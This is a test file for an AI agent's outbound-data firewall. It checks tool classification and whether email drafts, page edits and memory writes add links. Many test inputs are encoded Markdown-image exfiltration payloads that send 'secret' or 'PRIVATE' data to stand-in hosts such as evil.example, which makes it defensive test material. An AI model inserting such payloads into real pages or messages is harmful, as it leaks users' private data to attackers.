import { describe, expect, it } from "vitest";
import { EXTERNAL_TAINT_SAFE_TOOLS } from "./action-approval.js";
import {
  FIREWALL_ASK_TOOLS,
  FIREWALL_FREE_TOOLS,
  firewallDraftIsFree,
  firewallMemoryIsFree,
  firewallPageTextIsFree,
  firewallToolClass,
  urlLikeTokens,
} from "./firewall.js";

describe("firewallToolClass", () => {
  it("classifies the plan's examples", () => {
    expect(firewallToolClass("notify_user")).toBe("free");
    expect(firewallToolClass("mail_get")).toBe("free");
    expect(firewallToolClass("read_history")).toBe("free");
    expect(firewallToolClass("mail_send")).toBe("ask");
    expect(firewallToolClass("save_memory")).toBe("ask");
    expect(firewallToolClass("message_bot")).toBe("ask");
    expect(firewallToolClass("web_fetch")).toBe("ask");
  });

  it("drops anything that is not on a list, including names it has never seen", () => {
    for (const name of [
      "shell",
      "search_data_room",
      "calendar_query",
      "agent_send",
      "update_bot",
      "web_search",
      "some_future_tool",
      "mcp__server__send",
      "",
    ]) {
      expect(firewallToolClass(name)).toBe("dropped");
    }
  });

  it("asks on every mail_reply_batch call of a firewalled agent", () => {
    expect(firewallToolClass("mail_reply_batch")).toBe("ask");
  });

  it("keeps the lists disjoint", () => {
    for (const name of FIREWALL_FREE_TOOLS) expect(FIREWALL_ASK_TOOLS.has(name)).toBe(false);
  });

  it("does not inherit names from Object.prototype", () => {
    expect(firewallToolClass("constructor")).toBe("dropped");
    expect(firewallToolClass("__proto__")).toBe("dropped");
  });

  it("makes every tainted-run safe tool free, except the ones the profile narrows", () => {
    // A tool added to EXTERNAL_TAINT_SAFE_TOOLS later fails here until someone decides about it.
    const narrowed = new Map<string, string>([
      ["attach_file", "dropped"],
      ["list_secrets", "dropped"],
      ["page_source_set", "dropped"],
      ["page_source_remove", "dropped"],
      ["pins_write", "dropped"],
      ["page_write", "ask"],
      ["page_create", "ask"],
    ]);
    for (const name of EXTERNAL_TAINT_SAFE_TOOLS) {
      expect(firewallToolClass(name), name).toBe(narrowed.get(name) ?? "free");
    }
  });
});

describe("firewallDraftIsFree", () => {
  const participants = ["sam@customer.example", "support@us.example"];
  it("is free when every recipient is a thread participant and the body has no link", () => {
    expect(
      firewallDraftIsFree({ to: ["sam@customer.example"], body: "Thanks, fixed.", participants }),
    ).toBe(true);
    expect(
      firewallDraftIsFree({
        to: ["SAM@customer.example"],
        cc: ["support@us.example"],
        body: "ok",
        participants,
      }),
    ).toBe(true);
  });
  it("asks for a new recipient in to, cc or bcc", () => {
    for (const field of ["to", "cc", "bcc"] as const) {
      expect(
        firewallDraftIsFree({
          to: ["sam@customer.example"],
          [field]: ["billing@evil.example"],
          body: "x",
          participants,
        }),
      ).toBe(false);
    }
  });
  it("asks without recipients or without known participants, and for any link", () => {
    expect(firewallDraftIsFree({ to: [], body: "x", participants })).toBe(false);
    expect(firewallDraftIsFree({ to: ["sam@customer.example"], body: "x", participants: [] })).toBe(
      false,
    );
    for (const body of ["see http://evil.example/x", "www.evil.example", "https://a.example"]) {
      expect(firewallDraftIsFree({ to: ["sam@customer.example"], body, participants })).toBe(false);
    }
  });
});

describe("firewall URL-like text checks", () => {
  it("extracts whole URL-like lines exactly, case included", () => {
    expect(urlLikeTokens("HTTP://Evil.Test/path")).toEqual(["HTTP://Evil.Test/path"]);
    for (const text of [
      "https://evil.test/x",
      "www.evil.test/x",
      "src=evil.test/x",
      "url(evil.test/x)",
      "data:image/png;base64,abc",
      "mailto:evil@test",
      "ftp://evil.test/x",
      "custom://evil.test/x",
      "@import evil.test/x",
    ]) {
      expect(urlLikeTokens(text), text).not.toEqual([]);
    }
  });

  it("ignores a plain email address but still flags a bare domain URL", () => {
    expect(urlLikeTokens("shay@example.com")).toEqual([]);
    expect(urlLikeTokens("evil.test/x")).toEqual(["evil.test/x"]);
  });

  it("allows plain edits and unchanged existing links", () => {
    expect(firewallPageTextIsFree("Fix teh typo.", "Fix the typo.")).toBe(true);
    // Other lines change freely; the line that holds a link stays exactly as it was.
    expect(
      firewallPageTextIsFree(
        "Updated 11/09\nSee https://safe.test/a",
        "Updated 11/09 today\nSee https://safe.test/a",
      ),
    ).toBe(true);
    // Editing the words around a link changes its line, so it asks.
    expect(firewallPageTextIsFree("See https://safe.test/a", "Read https://safe.test/a")).toBe(
      false,
    );
    expect(firewallMemoryIsFree("likes tea")).toBe(true);
  });

  it("asks when an edit adds an outbound token, including a second slash", () => {
    expect(firewallPageTextIsFree("See this", "See https://evil.test/x")).toBe(false);
    expect(firewallPageTextIsFree("(/evil.test/x", "(//evil.test/x")).toBe(false);
    expect(
      firewallPageTextIsFree("https://evil.test/x", "https://evil.test/x https://evil.test/x"),
    ).toBe(false);
    for (const addition of [
      "src=evil.test/x",
      "url(evil.test/x)",
      "data:image/png;base64,abc",
      "www.evil.test/x",
    ]) {
      expect(firewallPageTextIsFree("plain", `plain ${addition}`), addition).toBe(false);
    }
  });

  it.each([
    ["numeric slash entities", "![](&#47;&#47;evil.example/x?d=secret)"],
    ["hex slash entities", "![](&#x2F;&#x2f;evil.example/x?d=secret)"],
    ["semicolon-free numeric slash entities", "![](&#47&#47evil.example/x?d=secret)"],
    ["nested slash entities", "![](&amp;#47;&amp;#47;evil.example/x?d=secret)"],
    ["named slash entities", "![](&sol;&sol;evil.example/x?d=secret)"],
    ["named backslash entities", "![](&bsol;&bsol;evil.example/x?d=secret)"],
    ["encoded scheme colon", "![](https&#58;//evil.example/x?d=secret)"],
    ["named scheme colon", "![](https&colon;//evil.example/x?d=secret)"],
    ["encoded scheme characters", "![](h&#116;tps://evil.example/x?d=secret)"],
    ["forward slash after backslash", "![](/\\evil.example/x)"],
    ["two backslashes", "![](\\\\evil.example/x)"],
    ["tab between slashes", "![](</\t/evil.example/x>)"],
    ["newline between slashes", "![](</\n/evil.example/x>)"],
    ["carriage return between slashes", "![](</\r/evil.example/x>)"],
  ])("asks when page text adds %s", (_label, text) => {
    expect(firewallPageTextIsFree("plain", `plain ${text}`)).toBe(false);
  });

  it("allows memory only when no argument contains a URL-like token", () => {
    expect(firewallMemoryIsFree("likes tea")).toBe(true);
    expect(firewallMemoryIsFree("refer to https://evil.test/x")).toBe(false);
    expect(firewallMemoryIsFree("![](&#47;&#47;host)")).toBe(false);
  });
});

describe("firewallPageTextIsFree link syntax", () => {
  const page =
    "Customers\n- Safa: waiting for his proof\n- See [docs](/app/docs) and example.com\n";
  it("keeps existing links and domains", () => {
    expect(
      firewallPageTextIsFree(page, page.replace("waiting for his proof", "proof received")),
    ).toBe(true);
  });
  it("asks for a new Markdown link or image, even to a relative path", () => {
    expect(firewallPageTextIsFree(page, `${page}- ![x](/a?d=secret)\n`)).toBe(false);
    expect(firewallPageTextIsFree(page, `${page}- [x](relative)\n`)).toBe(false);
  });
  it("asks for a reference definition, an HTML tag or a new bare domain", () => {
    expect(firewallPageTextIsFree(page, `${page}[r]: /x\n`)).toBe(false);
    expect(firewallPageTextIsFree(page, `${page}<img alt=x>\n`)).toBe(false);
    expect(firewallPageTextIsFree(page, `${page}evil.io/x\n`)).toBe(false);
  });
});

describe("firewallPageTextIsFree reference images", () => {
  it("asks when an existing address line gains a suffix or becomes a reference image", () => {
    const before = "Notes\n\nhttps://attacker.test/pixel \n";
    const after = "Notes\n\n![r]\n\n [r]: https://attacker.test/pixel&nbsp;PRIVATE123 \n";
    expect(firewallPageTextIsFree(before, after)).toBe(false);
    expect(firewallPageTextIsFree(before, "Notes\n\nhttps://attacker.test/pixel PRIVATE\n")).toBe(
      false,
    );
  });
  it("asks for an entity line break inside a destination", () => {
    expect(firewallPageTextIsFree("Notes\n", "Notes\n![x](/&#10;/evil.test/a)\n")).toBe(false);
  });
});

describe("firewallPageTextIsFree code blocks", () => {
  const line = "![i](https://example.org/c?s=PRIVATE)";
  // Removing a fence is caught by the parsed check in adapters (firewallPageWriteAddsNothing).
  it("asks when an indented code line is un-indented", () => {
    expect(firewallPageTextIsFree(`Notes\n\n    ${line}\n`, `Notes\n\n${line}\n`)).toBe(false);
  });
});
